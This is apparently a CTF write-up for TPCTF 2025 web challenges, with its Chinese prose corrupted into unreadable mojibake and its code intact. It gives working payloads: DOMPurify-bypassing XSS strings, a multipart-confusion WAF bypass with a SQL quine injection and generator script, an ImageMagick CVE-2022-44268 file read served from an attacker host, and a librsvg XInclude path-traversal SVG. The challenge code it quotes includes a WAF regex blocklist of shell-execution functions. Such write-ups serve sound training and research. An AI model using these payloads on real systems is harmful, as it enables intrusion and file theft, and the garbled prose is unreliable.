<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ä¸ä¸ºhtmlç»“æ„çš„æ—¶å€™ï¼ŒDOMPurifyæ— æ³•å¯¹å…ƒç´ è¿›è¡Œè§£æå’Œå‡€åŒ–ï¼Œæ˜¯å¯ä»¥æ­£å¸¸ä¼ å…¥onerrorçš„</p>
<p>æ‰€ä»¥å¯ä»¥è¿™æ ·æ„é€ payload</p>
<pre tabindex="0"><code>layoutï¼š
&lt;img src=&#34;{{content}}&#34;&gt;

contentï¼š
1&#34; onerror=&#34;alert(1)
</code></pre><p><img alt="image-20250310151407766" loading="lazy" src="../assets/image-20250310151407766.png"></p>
<p><img alt="image-20250310151430463" loading="lazy" src="../assets/image-20250310151430463.png"></p>
<h3 id="safe-layout">safe-layout<a hidden class="anchor" aria-hidden="true" href="#safe-layout">#</a></h3>
<p>è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«æ˜¯å¢åŠ äº†ALLOWED_ATTR: []</p>
<pre tabindex="0"><code>  const sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] });
</code></pre><p>ä¸€ä¸ªç±»ä¼¼ç™½åå•çš„ä¸œè¥¿ã€‚</p>
<p>ä½†æ˜¯è¿™ç©æ„å…¶å®å¹¶ä¸æ˜¯ç™½åå•ï¼Œè™½ç„¶è¯´ç¦ç”¨äº†æ‰€æœ‰çš„å±æ€§ï¼Œä½†æ˜¯data-*å’Œaira-*å±æ€§è¿˜æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„</p>
<p>è¿™ç¯‡æ–‡ç« ä¸­æœ‰æåˆ°ï¼š</p>
<p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists</a></p>
<p><img alt="image-20250313102830351" loading="lazy" src="../assets/image-20250313102830351.png"></p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ å‡ºpayload</p>
<p>content</p>
<pre tabindex="0"><code>123&#34; onload=&#34;alert(1)
</code></pre><p>layout</p>
<pre tabindex="0"><code>&lt;svg data-type=&#34;{{content}}&#34;&gt;&lt;/svg&gt;
</code></pre><p>æˆ–è€…æ˜¯</p>
<p>layout</p>
<pre tabindex="0"><code>&lt;svg aria-hidden=&#34;{{content}}&#34;&gt;&lt;/svg&gt;
</code></pre><h3 id="safe-layout-revenge">safe layout revenge<a hidden class="anchor" aria-hidden="true" href="#safe-layout-revenge">#</a></h3>
<p>è¿™é¢˜æŠŠä¸Šé¢˜ä¸­ä½¿ç”¨çš„aria-*å’Œdata-*ç»™banæ‰äº†</p>
<p><img alt="image-20250313104846923" loading="lazy" src="../assets/image-20250313104846923.png"></p>
<p>è¿˜æ˜¯çœ‹ä¸Šé¢˜ä¸­çš„é‚£ç¯‡æ–‡ç« </p>
<p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce">https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce</a></p>
<p><img alt="image-20250313105033752" loading="lazy" src="../assets/image-20250313105033752.png"></p>
<p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°çš„CVE-2023-48219ä¸­ï¼Œä¼šåœ¨DOMpurifyåå°†\uFFFFæ›¿æ¢ä¸ºç©ºã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ©ç”¨\uFEFFå¯¹htmlä»£ç è¿›è¡Œæˆªæ–­ï¼Œä»è€Œç»•è¿‡DOMpurify</p>
<p>å›åˆ°è¿™é“é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœã€‚æˆ‘ä»¬å¯ä»¥ç”¨{{content}}æ¥ä»£æ›¿\uFEFFå¯¹htmlè¿›è¡Œæˆªæ–­ã€‚</p>
<p>æ‰€ä»¥payloadå°±æ˜¯</p>
<pre tabindex="0"><code>//contentä¸ºç©º

layoutï¼š
x&lt;style&gt;&lt;{{content}}/style&gt;&lt;{{content}}img src=x onerror=alert(123)&gt;&lt;/style&gt;
</code></pre><p><img alt="image-20250313105755444" loading="lazy" src="../assets/image-20250313105755444.png"></p>
<h3 id="supersqli">supersqli<a hidden class="anchor" aria-hidden="true" href="#supersqli">#</a></h3>
<p>è€ƒç‚¹ï¼šè§£æå·®å¼‚ç»•è¿‡å’Œquineæ³¨å…¥</p>
<p>æ‹¿åˆ°é™„ä»¶</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é“é¢˜ç”¨goå®ç°äº†ä¸€ä¸ªåå‘ä»£ç†å’ŒWAF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-GO" data-lang="GO"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">sqlInjectionPattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\s+table|--|#|\*\/|\/\*)`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">rcePattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\s*\(.+\))`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">var</span> <span class="nx">hotfixPattern</span> <span class="p">=</span> <span class="nx">regexp</span><span class="p">.</span><span class="nf">MustCompile</span><span class="p">(</span><span class="s">`(?i)(select)`</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kd">var</span> <span class="nx">blockedUserAgents</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="s">&#34;sqlmap&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">	<span class="s">&#34;nmap&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">	<span class="s">&#34;curl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å†çœ‹åˆ°urls.py</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">from</span> <span class="nn">django.contrib</span> <span class="kn">import</span> <span class="n">admin</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kn">from</span> <span class="nn">django.urls</span> <span class="kn">import</span> <span class="n">path</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="kn">from</span> <span class="nn">blog</span> <span class="kn">import</span> <span class="n">views</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">urlpatterns</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s2">&#34;flag/&#34;</span><span class="p">,</span> <span class="n">views</span><span class="o">.</span><span class="n">flag</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="n">path</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">views</span><span class="o">.</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;index&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p>å®šä¹‰äº†ä¸€ä¸ªflagè·¯ç”±ï¼ŒæŒ‡å‘views.pyçš„flagå‡½æ•°</p>
<p>è·Ÿè¿›views</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">django.db</span> <span class="kn">import</span> <span class="n">connection</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># Create your views here.</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span><span class="n">HttpRequest</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">.models</span> <span class="kn">import</span> <span class="n">AdminUser</span><span class="p">,</span><span class="n">Blog</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">:</span><span class="n">HttpRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;Welcome to TPCTF 2025&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">(</span><span class="n">request</span><span class="p">:</span><span class="n">HttpRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">!=</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;Welcome to TPCTF 2025&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;you are not admin.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">users</span><span class="p">:</span><span class="n">AdminUser</span> <span class="o">=</span> <span class="n">AdminUser</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM blog_adminuser WHERE username=&#39;</span><span class="si">%s</span><span class="s2">&#39; and password =&#39;</span><span class="si">%s</span><span class="s2">&#39;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">assert</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">password</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;wrong password&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯è¦æƒ³åŠæ³•ç»•è¿‡wafï¼Œè¿›è¡Œsqlæ³¨å…¥</p>
<p>å¯ä»¥åˆ©ç”¨multipart boundaryæ¥ç»•è¿‡wafï¼Œå‚è€ƒä¸‹é¢çš„è¿™ç¯‡æ–‡ç« </p>
<p><a href="https://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86">https://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/flag/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:7788</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Chromium&#34;;v=&#34;134&#34;, &#34;Not:A-Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;134&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://mitm/</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=a</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">--a
</span></span><span class="line"><span class="ln">19</span><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">admin
</span></span><span class="line"><span class="ln">22</span><span class="cl">--a
</span></span><span class="line"><span class="ln">23</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;filename=&#34;password&#34;
</span></span><span class="line"><span class="ln">24</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">123
</span></span><span class="line"><span class="ln">27</span><span class="cl">--a--
</span></span></code></pre></div><p>è¿™é¢˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨quineæ³¨å…¥ï¼Œå³æ„é€ sqlè¯­å¥ä½¿æˆ‘ä»¬è¾“å…¥å’Œè¾“å‡ºçš„ç»“æœä¸€è‡´ï¼Œä»è€Œç»•è¿‡</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">assert</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">password</span><span class="w">
</span></span></span></code></pre></div><p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://www.cnblogs.com/meraklbz/p/18169584">https://www.cnblogs.com/meraklbz/p/18169584</a></p>
<p>ç”Ÿæˆä¸€ä¸ªpayload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">quine</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> 
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s2">&#34;REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">blob</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;$&#34;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="o">+</span><span class="n">blob</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">quine</span><span class="p">(</span><span class="s2">&#34;1&#39; union select 1,2,$$--&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>å®Œæ•´payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/flag/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:7788</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Chromium&#34;;v=&#34;134&#34;, &#34;Not:A-Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;134&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://mitm/</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=a</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">--a
</span></span><span class="line"><span class="ln">19</span><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">admin
</span></span><span class="line"><span class="ln">22</span><span class="cl">--a
</span></span><span class="line"><span class="ln">23</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;filename=&#34;password&#34;
</span></span><span class="line"><span class="ln">24</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">1&#39; union select 1,2,REPLACE(REPLACE(&#39;1&#34; union select 1,2,REPLACE(REPLACE(&#34;$&#34;,CHAR(34),CHAR(39)),CHAR(36),&#34;$&#34;)--&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;1&#34; union select 1,2,REPLACE(REPLACE(&#34;$&#34;,CHAR(34),CHAR(39)),CHAR(36),&#34;$&#34;)--&#39;)--
</span></span><span class="line"><span class="ln">27</span><span class="cl">--a--
</span></span></code></pre></div><p><img alt="image-20250316141627677" loading="lazy" src="../assets/image-20250316141627677.png"></p>
<h3 id="thumbor1">thumbor1<a hidden class="anchor" aria-hidden="true" href="#thumbor1">#</a></h3>
<p>thumboræ˜¯ä¸€ä¸ªå›¾ç‰‡å¤„ç†æœåŠ¡å·¥å…·ï¼Œå¯ä»¥å¯¹å›¾ç‰‡è¿›è¡ŒåŠ¨æ€è°ƒæ•´</p>
<p>é™„ä»¶åªæœ‰ä¸€ä¸ªdockerfile</p>
<p>å¯ä»¥èµ·ä¸ªdockeræ‹¿ä¸€ä¸‹æºç </p>
<p><img alt="image-20250316142606897" loading="lazy" src="../assets/image-20250316142606897.png"></p>
<p>è¿™é¢˜ä¸æ˜¯å› ä¸ºthumboræœ‰é—®é¢˜ï¼Œè€Œæ˜¯å› ä¸ºthumborçš„ä¸€ä¸ªç»„ä»¶ImageMagickå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¹Ÿå°±æ˜¯CVE-2022-44268ã€‚</p>
<p><img alt="image-20250316194653409" loading="lazy" src="../assets/image-20250316194653409.png"></p>
<p>å»GitHubæ‰¾ä¸€ä¸ªPOC</p>
<p><a href="https://github.com/voidz0r/CVE-2022-44268">voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read</a></p>
<p>ä»readmeå¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡ç±»ä¼¼ssrfçš„æ–¹å¼è¿œç¨‹åŠ è½½å›¾ç‰‡</p>
<p><img alt="image-20250316200524558" loading="lazy" src="../assets/image-20250316200524558.png"></p>
<p>åœ¨vpsä¸Šæ„é€ å¥½pngï¼Œè¿œç¨‹åŠ è½½å³å¯</p>
<pre tabindex="0"><code>http://localhost:8800/thumbor/unsafe/450x/YOUR_IP/å›¾ç‰‡
</code></pre><p>å…¶å®å°±æ˜¯å¤ç°cve</p>
<h3 id="thumbor2">thumbor2<a hidden class="anchor" aria-hidden="true" href="#thumbor2">#</a></h3>
<p>dockerfileé‡Œé¢å¢åŠ äº†æœ€æ–°ç‰ˆçš„ImageMagickï¼Œå…¶å®å°±æ˜¯ä¿®å¤äº†ä¸Šä¸€é¢˜çš„ImageMagick</p>
<p>è¿™é¢˜æ˜¯å¦ä¸€ä¸ªç»„ä»¶librsvgçš„æ¼æ´ï¼ŒCVE-2023-38633</p>
<blockquote>
<p>librsvg 2.56.3 ä¹‹å‰ç‰ˆæœ¬ä¸­ URL è§£ç å™¨çš„ç›®å½•éå†é—®é¢˜ï¼Œå¯ä»¥è¢«æœ¬åœ°æˆ–è¿œç¨‹æ”»å‡»è€…ç”¨æ¥æ³„éœ²æ–‡ä»¶ï¼ˆåœ¨é¢„æœŸåŒºåŸŸä¹‹å¤–çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šï¼‰ï¼Œä¾‹å¦‚é€šè¿‡åœ¨ xi:include å…ƒç´ ä¸­ä½¿ç”¨ href=â€œ.?../â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/etc/passwdâ€ æ¥è¯»å–ç»“æœã€‚
åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/HMX404/article/details/137231580</p></blockquote>
<p>åŸç†å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">When URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog</a></p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;  
&lt;svg width=&#34;3000&#34; height=&#34;3000&#34; xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt;  
   &lt;rect width=&#34;3000&#34; height=&#34;3000&#34; style=&#34;fill:rgb(255,255,255);&#34; /&gt;  
   &lt;text x=&#34;0&#34; y=&#34;1500&#34; font-size=&#34;100&#34;&gt;  
     &lt;xi:include href=&#34;.?../../../../../../../../flag&#34; parse=&#34;text&#34;   
encoding=&#34;UTF-8&#34;&gt;  
       &lt;xi:fallback&gt;file not found&lt;/xi:fallback&gt;  
     &lt;/xi:include&gt;  
   &lt;/text&gt;  
&lt;/svg&gt;
</code></pre><p>è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªtxtï¼Œå°†payloadå†™è¿›å»ï¼Œè¿œç¨‹åŠ è½½å³å¯</p>
<pre tabindex="0"><code>http://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
